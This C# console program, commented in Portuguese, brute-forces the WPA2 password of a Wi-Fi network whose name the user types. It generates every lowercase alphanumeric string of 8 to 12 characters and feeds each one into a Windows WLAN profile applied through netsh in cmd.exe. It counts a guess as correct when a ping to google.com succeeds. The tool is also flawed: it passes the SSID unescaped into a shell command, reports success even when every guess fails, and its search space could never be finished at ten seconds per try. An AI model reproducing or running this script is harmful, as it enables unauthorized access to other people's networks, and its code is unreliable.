using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Threading;
using System.Net.NetworkInformation;

class Program
{
    static void Main()
    {
        // Solicitar ao usuário o SSID da rede Wi-Fi:

        Console.Write("Digite o nome da rede Wi-Fi (SSID): ");

        string ssid = Console.ReadLine();

        // Definir os caracteres permitidos para a senha:

        char[] characters = "abcdefghijklmnopqrstuvwxyz0123456789".ToCharArray();

        // Definir os limites do comprimento da senha:

        int minPasswordLength = 8;
        int maxPasswordLength = 12;

        // Variável para verificar se a conexão foi bem-sucedida:

        bool connected = false;

        for (int length = minPasswordLength; length <= maxPasswordLength && !connected; length++)
        {
            Console.WriteLine($"\nSenhas com {length} dígito(s):");

            // Iteração:

            foreach (var password in GenerateCombinations(characters, "", length))
            {
                Console.WriteLine($"Senha: {password}");

                // Cria o perfil Wi-Fi com a senha gerada:

                CreateWiFiProfile(ssid, password);

                // Conecta à rede Wi-Fi:

                ConnectToWiFi(ssid);

                Thread.Sleep(10000);

                // Verifica a conexão:

                if (IsConnectedToInternet())
                {
                    Console.WriteLine("Conexão bem-sucedida!");
                    connected = true;
                    break;
                }
            }
        }

        Console.WriteLine("Conexão bem sucedida.");
        Console.ReadKey();
    }

    static IEnumerable<string> GenerateCombinations(char[] characters, string prefix, int length)
    {
        if (length == 0)
        {
            yield return prefix;
        }
        else
        {
            foreach (char c in characters)
            {
                foreach (var combination in GenerateCombinations(characters, prefix + c, length - 1))
                {
                    yield return combination;
                }
            }
        }
    }

    static void CreateWiFiProfile(string ssid, string password)
    {
        string profileFilePath = "wifi_profile.xml";

        // Criação do arquivo XML com as credenciais:

        System.IO.File.WriteAllText(profileFilePath,
            $"<?xml version=\"1.0\"?>\n" +
            $"<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\n" +
            $"  <name>{ssid}</name>\n" +
            $"  <SSIDConfig>\n" +
            $"    <SSID>\n" +
            $"      <name>{ssid}</name>\n" +
            $"    </SSID>\n" +
            $"  </SSIDConfig>\n" +
            $"  <connectionType>ESS</connectionType>\n" +
            $"  <connectionMode>auto</connectionMode>\n" +
            $"  <MSM>\n" +
            $"    <security>\n" +
            $"      <authEncryption>\n" +
            $"        <authentication>WPA2PSK</authentication>\n" +
            $"        <encryption>AES</encryption>\n" +
            $"        <useOneX>false</useOneX>\n" +
            $"      </authEncryption>\n" +
            $"      <sharedKey>\n" +
            $"        <keyType>passPhrase</keyType>\n" +
            $"        <protected>false</protected>\n" +
            $"        <keyMaterial>{password}</keyMaterial>\n" +
            $"      </sharedKey>\n" +
            $"    </security>\n" +
            $"  </MSM>\n" +
            $"</WLANProfile>");

        ExecuteCommand($"netsh wlan add profile filename=\"{profileFilePath}\"");
    }

    static void ConnectToWiFi(string ssid)
    {
        ExecuteCommand($"netsh wlan connect name=\"{ssid}\"");
    }

    static bool IsConnectedToInternet()
    {
        try
        {
            // Verificando a conexão com a internet:

            using (Ping ping = new Ping())
            {
                PingReply reply = ping.Send("www.google.com", 5000);
                if (reply.Status == IPStatus.Success)
                {
                    return true;
                }
            }
        }
        catch (PingException)
        {
            // Ocorreu um erro ao tentar pingar, conexão falhou.
        }

        return false;
    }

    static string ExecuteCommand(string command)
    {
        var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/C " + command,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            }
        };

        process.Start();

        // Ler a saída e a saída de erro:

        string output = process.StandardOutput.ReadToEnd();
        string error = process.StandardError.ReadToEnd();
        process.WaitForExit();

        if (process.ExitCode == 0)
        {
            Console.WriteLine($"Comando executado com sucesso.");
        }
        else
        {
            Console.WriteLine($"Erro ao executar o comando: {error}");
        }

        return output;
    }
}